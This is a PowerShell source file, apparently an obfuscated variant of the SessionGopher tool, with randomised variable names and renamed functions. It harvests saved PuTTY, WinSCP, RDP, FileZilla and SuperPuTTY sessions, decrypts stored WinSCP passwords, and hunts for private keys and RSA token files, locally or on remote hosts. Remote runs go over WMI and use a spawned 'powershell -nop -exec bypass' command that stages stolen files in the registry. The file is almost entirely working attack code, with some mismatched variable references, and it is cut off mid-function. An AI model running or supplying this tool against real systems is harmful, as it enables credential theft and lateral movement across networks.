
function cachet {
  param (
      [switch]$o, # Generate CSV output
      [switch]$hdPXEKUQjxCYg9C, # Searches entire filesystem for certain file extensions
      [string]$u, # Domain\username (e.g. superduper.com\a-jerry)
      [string]$p, # Password of domain account
      [string]$iL, # A file of hosts to run SessionGopher against remotely, each host separated by a newline in the file
      [string]$p9REFRiCCsuC9In, # If you want to run SessionGopher against one specific host
      [switch]$qMELeoMyJPUTJQY # Run across all active directory
  )

  Write-Output '
          o_       
         /  ".   SessionGopher
       ,"  _-"      
     ,"   m m         
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com
  '

  if ($o) {
    $zPRwy9FdrtsVRzg = "SessionGopher (" + (Get-Date -Format "HH.mm.ss") + ")"
    New-Item -ItemType Directory $zPRwy9FdrtsVRzg | Out-Null
    New-Item ($zPRwy9FdrtsVRzg + "\PuTTY.csv") -Type File | Out-Null
    New-Item ($zPRwy9FdrtsVRzg + "\SuperPuTTY.csv") -Type File | Out-Null
    New-Item ($zPRwy9FdrtsVRzg + "\WinSCP.csv") -Type File | Out-Null
    New-Item ($zPRwy9FdrtsVRzg + "\FileZilla.csv") -Type File | Out-Null
    New-Item ($zPRwy9FdrtsVRzg + "\RDP.csv") -Type File | Out-Null
    if ($hdPXEKUQjxCYg9C) {
        New-Item ($zPRwy9FdrtsVRzg + "\PuTTY ppk Files.csv") -Type File | Out-Null
        New-Item ($zPRwy9FdrtsVRzg + "\Microsoft rdp Files.csv") -Type File | Out-Null
        New-Item ($zPRwy9FdrtsVRzg + "\RSA sdtid Files.csv") -Type File | Out-Null
    }
  }

  if ($u -and $p) {
    $fGXVxzAmP9cBYAr = ConvertTo-SecureString $p -AsPlainText -Force
    $nkgC9zQvHxAXTk9 = New-Object -Typename System.Management.Automation.PSCredential -ArgumentList $u, $fGXVxzAmP9cBYAr
  }


  $HKU = 2147483651

  $HKLM = 2147483650

  $YmFMtBsKII9ePhI = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $hUAQiRXSTz9NfCo = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
  $9JUuYMtpnTYQPMX = "\SOFTWARE\Microsoft\Terminal Server Client\Servers"

  if ($iL -or $qMELeoMyJPUTJQY -or $p9REFRiCCsuC9In) {


    $h99rpPyBhW9OYpp = ""

    if ($qMELeoMyJPUTJQY) {
      $h99rpPyBhW9OYpp = antivirals
    } elseif ($iL) { 
      $h99rpPyBhW9OYpp = Get-Content ((Resolve-Path $iL).Path)
    } elseif ($p9REFRiCCsuC9In) {
      $h99rpPyBhW9OYpp = $p9REFRiCCsuC9In
    }

    $OFQniJ9pBKnGEri = @{}
    if ($nkgC9zQvHxAXTk9) {
      $OFQniJ9pBKnGEri['Credential'] = $nkgC9zQvHxAXTk9
    }

    foreach ($FihclsuUejmorCq in $h99rpPyBhW9OYpp) {

      if ($qMELeoMyJPUTJQY) {

        $FihclsuUejmorCq = $FihclsuUejmorCq.Properties.name
        if (!$FihclsuUejmorCq) { Continue }
      }

      Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
      Write-Host "Digging on" $FihclsuUejmorCq"..."

      $SIDS = Invoke-WmiMethod -Class 'StdRegProv' -Name 'EnumKey' -ArgumentList $HKU,'' -ComputerName $FihclsuUejmorCq @optionalCreds | Select-Object -ExpandProperty sNames | Where-Object {$_ -match 'S-1-5-21-[\d\-]+$'}

      foreach ($SID in $SIDs) {


        $ggLuBPimyiJwQuR = try { (Split-Path -Leaf (Split-Path -Leaf (beanbag))) } catch {}
        $9dmptIQvAWIrBtO = (($FihclsuUejmorCq + "\" + $ggLuBPimyiJwQuR) -Join "")


        $V9joSisJDLQPInP = New-Object PSObject


        $syHqDrMywPTJprj = New-Object System.Collections.ArrayList
        $muzrifeMsMRPGSl = New-Object System.Collections.ArrayList
        $vPIjdrTXjYCbuew = New-Object System.Collections.ArrayList
        $EpFdJVExPKHuYcZ = New-Object System.Collections.ArrayList
        $d9zjC9MrnEqjuDK = New-Object System.Collections.ArrayList


        $D9wMVfnzTcEYtoc = $SID + $9JUuYMtpnTYQPMX
        $XDXyugGv9xkQpXo = $SID + $YmFMtBsKII9ePhI
        $azNsPQOqGFMOGlD = $SID + $hUAQiRXSTz9NfCo
        $tjXGnPGUodYIaQK = "Drive='C:' AND Path='\\Users\\$ggLuBPimyiJwQuR\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
        $fiViRY9LioUR99p = "Drive='C:' AND Path='\\Users\\$ggLuBPimyiJwQuR\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"

        $9EbwhfRDpIAQa9B = Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$D9wMVfnzTcEYtoc @optionalCreds
        $APKxJZkYQI9XGnA = Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$XDXyugGv9xkQpXo @optionalCreds
        $nhpI9LbowuwdiBt = Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name EnumKey -ArgumentList $HKU,$azNsPQOqGFMOGlD @optionalCreds
        $Kdi9ilat9ZJmRDb = (Get-WmiObject -Class 'CIM_DataFile' -Filter $tjXGnPGUodYIaQK -ComputerName $FihclsuUejmorCq @optionalCreds | Select Name)
        $Gdvlx9HnRHgAfUb = (Get-WmiObject -Class 'CIM_DataFile' -Filter $fiViRY9LioUR99p -ComputerName $FihclsuUejmorCq @optionalCreds | Select Name)


        if (($nhpI9LbowuwdiBt | Select-Object -ExpandPropert ReturnValue) -eq 0) {


          $nhpI9LbowuwdiBt = $nhpI9LbowuwdiBt | Select-Object -ExpandProperty sNames
          
          foreach ($9lpDIZWRXPyjyAu in $nhpI9LbowuwdiBt) {
      
            $LCObjKFbkLskmuo = "" | Select-Object -Property Source,Session,Hostname,Username,Password
            $LCObjKFbkLskmuo.Source = $9dmptIQvAWIrBtO
            $LCObjKFbkLskmuo.Session = $9lpDIZWRXPyjyAu

            $idyJQmxkauBOafr = $azNsPQOqGFMOGlD + "\" + $9lpDIZWRXPyjyAu

            $LCObjKFbkLskmuo.Hostname = (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$idyJQmxkauBOafr,"HostName" @optionalCreds).sValue
            $LCObjKFbkLskmuo.Username = (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$idyJQmxkauBOafr,"UserName" @optionalCreds).sValue
            $LCObjKFbkLskmuo.Password = (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$idyJQmxkauBOafr,"Password" @optionalCreds).sValue

            if ($LCObjKFbkLskmuo.Password) {

              $yGkWFOy99qz9HSM = $SID + "\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
          
              $Mw9zPDORgH99mYT = (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name GetDWordValue -ArgumentList $HKU,$yGkWFOy99qz9HSM,"UseMasterPassword" @optionalCreds).uValue
              
              if (!$Mw9zPDORgH99mYT) {
                  $LCObjKFbkLskmuo.Password = (DecryptWinSCPPassword $LCObjKFbkLskmuo.Hostname $LCObjKFbkLskmuo.Username $LCObjKFbkLskmuo.Password)
              } else {
                  $LCObjKFbkLskmuo.Password = "Saved in session, but master password prevents plaintext recovery"
              }

            }
             
            [void]$d9zjC9MrnEqjuDK.Add($LCObjKFbkLskmuo)
      
          } # For Each WinSCP Session

          if ($d9zjC9MrnEqjuDK.count -gt 0) {

            $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -Value $d9zjC9MrnEqjuDK

            if ($o) {
              $d9zjC9MrnEqjuDK | Select-Object * | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\WinSCP.csv") -NoTypeInformation
            } else {
              Write-Output "WinSCP Sessions"
              $d9zjC9MrnEqjuDK | Select-Object * | Format-List | Out-String
            }

          }
        
        } # If path to WinSCP exists

        if (($APKxJZkYQI9XGnA | Select-Object -ExpandPropert ReturnValue) -eq 0) {


          $APKxJZkYQI9XGnA = $APKxJZkYQI9XGnA | Select-Object -ExpandProperty sNames

          foreach ($sdwTIAlDSEvGFMv in $APKxJZkYQI9XGnA) {
      
            $GoBWdZjNHqxctqm = "" | Select-Object -Property Source,Session,Hostname

            $idyJQmxkauBOafr = $XDXyugGv9xkQpXo + "\" + $sdwTIAlDSEvGFMv

            $GoBWdZjNHqxctqm.Source = $9dmptIQvAWIrBtO
            $GoBWdZjNHqxctqm.Session = $sdwTIAlDSEvGFMv
            $GoBWdZjNHqxctqm.Hostname = (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$idyJQmxkauBOafr,"HostName" @optionalCreds).sValue
             
            [void]$syHqDrMywPTJprj.Add($GoBWdZjNHqxctqm)
      
          }

          if ($syHqDrMywPTJprj.count -gt 0) {

            $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $syHqDrMywPTJprj

            if ($o) {
              $syHqDrMywPTJprj | Select-Object * | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\PuTTY.csv") -NoTypeInformation
            } else {
              Write-Output "PuTTY Sessions"
              $syHqDrMywPTJprj | Select-Object * | Format-List | Out-String
            }

          }

        } # If PuTTY session exists

        if (($9EbwhfRDpIAQa9B | Select-Object -ExpandPropert ReturnValue) -eq 0) {


          $9EbwhfRDpIAQa9B = $9EbwhfRDpIAQa9B | Select-Object -ExpandProperty sNames

          foreach ($VrHcV9Yvshxrdeu in $9EbwhfRDpIAQa9B) {
      
            $9RiJbwhgKbl9CtD = "" | Select-Object -Property Source,Hostname,Username
            
            $idyJQmxkauBOafr = $D9wMVfnzTcEYtoc + "\" + $VrHcV9Yvshxrdeu

            $9RiJbwhgKbl9CtD.Source = $9dmptIQvAWIrBtO
            $9RiJbwhgKbl9CtD.Hostname = $VrHcV9Yvshxrdeu
            $9RiJbwhgKbl9CtD.Username = (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name GetStringValue -ArgumentList $HKU,$idyJQmxkauBOafr,"UserNameHint" @optionalCreds).sValue

            [void]$vPIjdrTXjYCbuew.Add($9RiJbwhgKbl9CtD)
      
          }

          if ($vPIjdrTXjYCbuew.count -gt 0) {

            $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -Value $vPIjdrTXjYCbuew

            if ($o) {
              $vPIjdrTXjYCbuew | Select-Object * | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\RDP.csv") -NoTypeInformation
            } else {
              Write-Output "Microsoft RDP Sessions"
              $vPIjdrTXjYCbuew | Select-Object * | Format-List | Out-String
            }

          }

        } # If RDP sessions exist


        if ($Kdi9ilat9ZJmRDb.Name) {

          $File = "C:\Users\$ggLuBPimyiJwQuR\Documents\SuperPuTTY\Sessions.xml"
          $RHVgAfc9LXVCzZd = DownloadAndExtractFromRemoteRegistry $File

          [xml]$VhtJEeNXNsVmvvQ = $RHVgAfc9LXVCzZd
          (ProcessSuperPuTTYFile $VhtJEeNXNsVmvvQ)

        }


        if ($Gdvlx9HnRHgAfUb.Name) {

          $File = "C:\Users\$ggLuBPimyiJwQuR\AppData\Roaming\FileZilla\sitemanager.xml"
          $RHVgAfc9LXVCzZd = DownloadAndExtractFromRemoteRegistry $File

          [xml]$DnZtKlK9NayrWx9 = $RHVgAfc9LXVCzZd
          (ProcessFileZillaFile $DnZtKlK9NayrWx9)

        } # FileZilla

      } # for each SID

      if ($hdPXEKUQjxCYg9C) {

        $uTLibPDMibhEOhJ = New-Object System.Collections.ArrayList
        $NpEpKAllBWZHx9K = New-Object System.Collections.ArrayList
        $aLapaagzarVqLxc = New-Object System.Collections.ArrayList

        $yXnrckb99GbxRtw = (Get-WmiObject -Class 'CIM_DataFile' -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName $FihclsuUejmorCq @optionalCreds | Select Name)

        (ProcessThoroughRemote $yXnrckb99GbxRtw)
        
      } 

    } # for each remote computer


  } else { 
    
    Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
    Write-Host "Digging on"(Hostname)"..."


    $DCLgvNccmWWXnTl = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}


    foreach($Hive in $DCLgvNccmWWXnTl) {


      $V9joSisJDLQPInP = New-Object PSObject

      $d9zjC9MrnEqjuDK = New-Object System.Collections.ArrayList
      $syHqDrMywPTJprj = New-Object System.Collections.ArrayList
      $uTLibPDMibhEOhJ = New-Object System.Collections.ArrayList
      $muzrifeMsMRPGSl = New-Object System.Collections.ArrayList
      $vPIjdrTXjYCbuew = New-Object System.Collections.ArrayList
      $NpEpKAllBWZHx9K = New-Object System.Collections.ArrayList
      $EpFdJVExPKHuYcZ = New-Object System.Collections.ArrayList

      $d9kmwKdh9qsomvT = (beanbag)
      $9dmptIQvAWIrBtO = (Hostname) + "\" + (Split-Path $d9kmwKdh9qsomvT.Value -Leaf)

      $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "Source" -Value $d9kmwKdh9qsomvT.Value


      $XDXyugGv9xkQpXo = Join-Path $Hive.PSPath "\$YmFMtBsKII9ePhI"
      $azNsPQOqGFMOGlD = Join-Path $Hive.PSPath "\$hUAQiRXSTz9NfCo"
      $hmTCBceZuxNuAnN = Join-Path $Hive.PSPath "\$9JUuYMtpnTYQPMX"
      $Gdvlx9HnRHgAfUb = "C:\Users\" + (Split-Path -Leaf $V9joSisJDLQPInP."Source") + "\AppData\Roaming\FileZilla\sitemanager.xml"
      $Kdi9ilat9ZJmRDb = "C:\Users\" + (Split-Path -Leaf $V9joSisJDLQPInP."Source") + "\Documents\SuperPuTTY\Sessions.xml"

      if (Test-Path $Gdvlx9HnRHgAfUb) {

        [xml]$DnZtKlK9NayrWx9 = Get-Content $Gdvlx9HnRHgAfUb
        (ProcessFileZillaFile $DnZtKlK9NayrWx9)

      }

      if (Test-Path $Kdi9ilat9ZJmRDb) {

        [xml]$VhtJEeNXNsVmvvQ = Get-Content $Kdi9ilat9ZJmRDb
        (ProcessSuperPuTTYFile $VhtJEeNXNsVmvvQ)

      }

      if (Test-Path $hmTCBceZuxNuAnN) {


        $9lSMYGpcztGkGnz = Get-ChildItem $hmTCBceZuxNuAnN

        (ProcessRDPLocal $9lSMYGpcztGkGnz)

      } # If (Test-Path MicrosoftRDPPath)

      if (Test-Path $azNsPQOqGFMOGlD) {


        $VTxZ9WXqTI99p9H = Get-ChildItem $azNsPQOqGFMOGlD

        (ProcessWinSCPLocal $VTxZ9WXqTI99p9H)

      } # If (Test-Path WinSCPPath)
      
      if (Test-Path $XDXyugGv9xkQpXo) {


        $nEz9BqLfCLksBaQ = Get-ChildItem $XDXyugGv9xkQpXo

        (ProcessPuTTYLocal $nEz9BqLfCLksBaQ)

      } # If (Test-Path PuTTYPath)

    } # For each Hive in UserHives


    if ($hdPXEKUQjxCYg9C) {


      $YtRxwozAYQBG9wb = New-Object System.Collections.ArrayList
      $eWNrJqqNTZjoBak = New-Object System.Collections.ArrayList
      $YJbRCYRyMeA9xLO = New-Object System.Collections.ArrayList


      $Y9ZdFBS9qGEzwvw = Get-PSDrive

      (ProcessThoroughLocal $Y9ZdFBS9qGEzwvw)
      
      (ProcessPPKFile $YtRxwozAYQBG9wb)
      (ProcessRDPFile $eWNrJqqNTZjoBak)
      (ProcesssdtidFile $YJbRCYRyMeA9xLO)

    } # If Thorough

  } # Else -- run SessionGopher locally

} # cachet








function beanbag {


  if ($iL -or $p9REFRiCCsuC9In -or $qMELeoMyJPUTJQY) {

    $nzsFlXYuyXYxvmm = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$SID"
    $Value = "ProfileImagePath"

    return (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM,$nzsFlXYuyXYxvmm,$Value @optionalCreds).sValue

  } else {

    $SID = (Split-Path $Hive.Name -Leaf)
    $9CTWMwVuyDTWhyP = New-Object System.Security.Principal.SecurityIdentifier("$SID")
    return $9CTWMwVuyDTWhyP.Translate( [System.Security.Principal.NTAccount])
  }

}

function DownloadAndExtractFromRemoteRegistry($File) {


  $cULffpwskvlFDwr = "HKLM:\Software\Microsoft\DRM"
  $JbbUDJK9WLgCK9a = "ReadMe"
  $TT9VqcmH9dLWosR = "SOFTWARE\Microsoft\DRM"
          

  Write-Verbose "Reading remote file and writing on remote registry"
  $FFKsyEgNnPrUgJk = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $heCvOJXTToqDjtf = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$cULffpwskvlFDwr'" + ' -Name ' + "'$JbbUDJK9WLgCK9a'" + ' -Value $heCvOJXTToqDjtf -PropertyType String -Force'
  $FFKsyEgNnPrUgJk = 'powershell -nop -exec bypass -c "' + $FFKsyEgNnPrUgJk + '"'

  $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $FFKsyEgNnPrUgJk -ComputerName $FihclsuUejmorCq @optionalCreds


  Start-Sleep -s 15

  $HjlrjPgFXfIvgoq = ""


  $HjlrjPgFXfIvgoq = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM, $TT9VqcmH9dLWosR, $JbbUDJK9WLgCK9a -Computer $FihclsuUejmorCq @optionalCreds
  
  $bSivwuZeE9tNjvl = [System.Convert]::FromBase64String($HjlrjPgFXfIvgoq.sValue)
  $iOhKinHRROeqPDZ = [System.Text.Encoding]::UTF8.GetString($bSivwuZeE9tNjvl) 
    

  $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $wzUAsy9Dj9WwYlQ, $TT9VqcmH9dLWosR, $JbbUDJK9WLgCK9a -ComputerName $FihclsuUejmorCq @optionalCreds
  
  return $iOhKinHRROeqPDZ

}







function ProcessThoroughLocal($Y9ZdFBS9qGEzwvw) {
  
  foreach ($Drive in $Y9ZdFBS9qGEzwvw) {

    if ($Drive.Provider.Name -eq "FileSystem") {
      $Dirs = Get-ChildItem $Drive.Root -Recurse -ErrorAction SilentlyContinue
      foreach ($Dir in $Dirs) {
        Switch ($Dir.Extension) {
          ".ppk" {[void]$YtRxwozAYQBG9wb.Add($Dir)}
          ".rdp" {[void]$eWNrJqqNTZjoBak.Add($Dir)}
          ".sdtid" {[void]$YJbRCYRyMeA9xLO.Add($Dir)}
        }
      }
    }
  }

}

function ProcessThoroughRemote($yXnrckb99GbxRtw) {

  foreach ($gfoUnwuwfmhBuAE in $yXnrckb99GbxRtw) {

      $XtRSEeVgx9lKzKF = "" | Select-Object -Property Source,Path
      $XtRSEeVgx9lKzKF.Source = $FihclsuUejmorCq

      $jYNfAmVplYJFcLE = [IO.Path]::GetExtension($gfoUnwuwfmhBuAE.Name)

      if ($jYNfAmVplYJFcLE -eq ".ppk") {
        $XtRSEeVgx9lKzKF.Path = $gfoUnwuwfmhBuAE.Name
        [void]$uTLibPDMibhEOhJ.Add($XtRSEeVgx9lKzKF)
      } elseif ($jYNfAmVplYJFcLE -eq ".rdp") {
        $XtRSEeVgx9lKzKF.Path = $gfoUnwuwfmhBuAE.Name
        [void]$NpEpKAllBWZHx9K.Add($XtRSEeVgx9lKzKF)
      } elseif ($jYNfAmVplYJFcLE -eq ".sdtid") {
        $XtRSEeVgx9lKzKF.Path = $gfoUnwuwfmhBuAE.Name
        [void]$aLapaagzarVqLxc.Add($XtRSEeVgx9lKzKF)
      }

  }

  if ($uTLibPDMibhEOhJ.count -gt 0) {

    $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "PPK Files" -Value $NpEpKAllBWZHx9K

    if ($o) {
      $uTLibPDMibhEOhJ | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $uTLibPDMibhEOhJ | Format-List | Out-String
    }
  }

  if ($NpEpKAllBWZHx9K.count -gt 0) {

    $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "RDP Files" -Value $NpEpKAllBWZHx9K

    if ($o) {
      $NpEpKAllBWZHx9K | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $NpEpKAllBWZHx9K | Format-List | Out-String
    }
  }
  if ($aLapaagzarVqLxc.count -gt 0) {

    $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "sdtid Files" -Value $aLapaagzarVqLxc

    if ($o) {
      $aLapaagzarVqLxc | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $aLapaagzarVqLxc | Format-List | Out-String
    }

  }

} # ProcessThoroughRemote

function ProcessPuTTYLocal($nEz9BqLfCLksBaQ) {
  

  foreach($XqQmLH9cAzise9c in $nEz9BqLfCLksBaQ) {

    $GoBWdZjNHqxctqm = "" | Select-Object -Property Source,Session,Hostname

    $GoBWdZjNHqxctqm.Source = $9dmptIQvAWIrBtO
    $GoBWdZjNHqxctqm.Session = (Split-Path $XqQmLH9cAzise9c -Leaf)
    $GoBWdZjNHqxctqm.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $XqQmLH9cAzise9c) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)


    [void]$syHqDrMywPTJprj.Add($GoBWdZjNHqxctqm)

  }

  if ($o) {
    $syHqDrMywPTJprj | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\PuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "PuTTY Sessions"
    $syHqDrMywPTJprj | Format-List | Out-String
  }


  $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $syHqDrMywPTJprj

} # ProcessPuTTYLocal

function ProcessRDPLocal($9lSMYGpcztGkGnz) {


  foreach($XqQmLH9cAzise9c in $9lSMYGpcztGkGnz) {

    $gHienLOKdftmGk9 = "Microsoft.PowerShell.Core\Registry::" + $XqQmLH9cAzise9c

    $XwBbJ9GgChBoYK9 = "" | Select-Object -Property Source,Hostname,Username

    $XwBbJ9GgChBoYK9.Source = $9dmptIQvAWIrBtO
    $XwBbJ9GgChBoYK9.Hostname = (Split-Path $XqQmLH9cAzise9c -Leaf)
    $XwBbJ9GgChBoYK9.Username = ((Get-ItemProperty -Path $gHienLOKdftmGk9 -Name "UsernameHint" -ErrorAction SilentlyContinue).UsernameHint)


    [void]$vPIjdrTXjYCbuew.Add($XwBbJ9GgChBoYK9)

  } # For each Session in AllRDPSessions

  if ($o) {
    $vPIjdrTXjYCbuew | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\RDP.csv") -NoTypeInformation
  } else {
    Write-Output "Microsoft Remote Desktop (RDP) Sessions"
    $vPIjdrTXjYCbuew | Format-List | Out-String
  }


  $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -Value $vPIjdrTXjYCbuew

} #ProcessRDPLocal

function ProcessWinSCPLocal($VTxZ9WXqTI99p9H) {
  

  foreach($XqQmLH9cAzise9c in $VTxZ9WXqTI99p9H) {

    $9FvrFXsaeiakTRx = "Microsoft.PowerShell.Core\Registry::" + $XqQmLH9cAzise9c

    $LCObjKFbkLskmuo = "" | Select-Object -Property Source,Session,Hostname,Username,Password

    $LCObjKFbkLskmuo.Source = $9dmptIQvAWIrBtO
    $LCObjKFbkLskmuo.Session = (Split-Path $XqQmLH9cAzise9c -Leaf)
    $LCObjKFbkLskmuo.Hostname = ((Get-ItemProperty -Path $9FvrFXsaeiakTRx -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $LCObjKFbkLskmuo.Username = ((Get-ItemProperty -Path $9FvrFXsaeiakTRx -Name "Username" -ErrorAction SilentlyContinue).Username)
    $LCObjKFbkLskmuo.Password = ((Get-ItemProperty -Path $9FvrFXsaeiakTRx -Name "Password" -ErrorAction SilentlyContinue).Password)

    if ($LCObjKFbkLskmuo.Password) {
      $Mw9zPDORgH99mYT = ((Get-ItemProperty -Path (Join-Path $Hive.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)


      if (!$Mw9zPDORgH99mYT) {
          $LCObjKFbkLskmuo.Password = (DecryptWinSCPPassword $LCObjKFbkLskmuo.Hostname $LCObjKFbkLskmuo.Username $LCObjKFbkLskmuo.Password)

      } else {
          $LCObjKFbkLskmuo.Password = "Saved in session, but master password prevents plaintext recovery"
      }
    }


    [void]$d9zjC9MrnEqjuDK.Add($LCObjKFbkLskmuo)

  } # For each Session in AllWinSCPSessions

  if ($o) {
    $d9zjC9MrnEqjuDK | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\WinSCP.csv") -NoTypeInformation
  } else {
    Write-Output "WinSCP Sessions"
    $d9zjC9MrnEqjuDK | Format-List | Out-String
  }


  $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -Value $d9zjC9MrnEqjuDK

} # ProcessWinSCPLocal

function ProcesssdtidFile($YJbRCYRyMeA9xLO) {

  foreach ($Path in $YJbRCYRyMeA9xLO.VersionInfo.FileName) {

    $Kniz9WPQzpVdpxF = "" | Select-Object -Property "Source","Path"

    $Kniz9WPQzpVdpxF."Source" = $9dmptIQvAWIrBtO
    $Kniz9WPQzpVdpxF."Path" = $Path

    [void]$aLapaagzarVqLxc.Add($Kniz9WPQzpVdpxF)

  }

  if ($aLapaagzarVqLxc.count -gt 0) {

    $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "sdtid Files" -Value $aLapaagzarVqLxc

    if ($o) {
      $aLapaagzarVqLxc | Select-Object * | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\RSA sdtid Files.csv") -NoTypeInformation
    } else {
      Write-Output "RSA Tokens (sdtid)"
      $aLapaagzarVqLxc | Select-Object * | Format-List | Out-String
    }

  }

} # Process sdtid File

function ProcessRDPFile($eWNrJqqNTZjoBak) {
  

  foreach ($Path in $eWNrJqqNTZjoBak.VersionInfo.FileName) {
    
    $bLDXVyDTtbAVfll = "" | Select-Object -Property "Source","Path","Hostname","Gateway","Prompts for Credentials","Administrative Session"

    $bLDXVyDTtbAVfll."Source" = (Hostname)


    $bLDXVyDTtbAVfll."Path" = $Path 
    $bLDXVyDTtbAVfll."Hostname" = try { (Select-String -Path $Path -Pattern "full address:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $bLDXVyDTtbAVfll."Gateway" = try { (Select-String -Path $Path -Pattern "gatewayhostname:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $bLDXVyDTtbAVfll."Administrative Session" = try { (Select-String -Path $Path -Pattern "administrative session:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
    $bLDXVyDTtbAVfll."Prompts for Credentials" = try { (Select-String -Path $Path -Pattern "prompt for credentials:[a-z]:(.*)").Matches.Groups[1].Value } catch {}

    if (!$bLDXVyDTtbAVfll."Administrative Session" -or !$bLDXVyDTtbAVfll."Administrative Session" -eq 0) {
      $bLDXVyDTtbAVfll."Administrative Session" = "Does not connect to admin session on remote host"
    } else {
      $bLDXVyDTtbAVfll."Administrative Session" = "Connects to admin session on remote host"
    }
    if (!$bLDXVyDTtbAVfll."Prompts for Credentials" -or $bLDXVyDTtbAVfll."Prompts for Credentials" -eq 0) {
      $bLDXVyDTtbAVfll."Prompts for Credentials" = "No"
    } else {
      $bLDXVyDTtbAVfll."Prompts for Credentials" = "Yes"
    }

    [void]$NpEpKAllBWZHx9K.Add($bLDXVyDTtbAVfll)

  }

  if ($NpEpKAllBWZHx9K.count -gt 0) {

    $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "RDP Files" -Value $NpEpKAllBWZHx9K

    if ($o) {
      $NpEpKAllBWZHx9K | Select-Object * | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\Microsoft rdp Files.csv") -NoTypeInformation
    } else {
      Write-Output "Microsoft RDP Connection Files (.rdp)"
      $NpEpKAllBWZHx9K | Select-Object * | Format-List | Out-String
    }

  }

} # Process RDP File

function ProcessPPKFile($YtRxwozAYQBG9wb) {


  foreach ($Path in $YtRxwozAYQBG9wb.VersionInfo.FileName) {


    $NfcomAmiyeNdChC = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"

    $NfcomAmiyeNdChC."Source" = (Hostname)


    $NfcomAmiyeNdChC."Path" = $Path

    $NfcomAmiyeNdChC."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
    $NfcomAmiyeNdChC."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
    $NfcomAmiyeNdChC."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
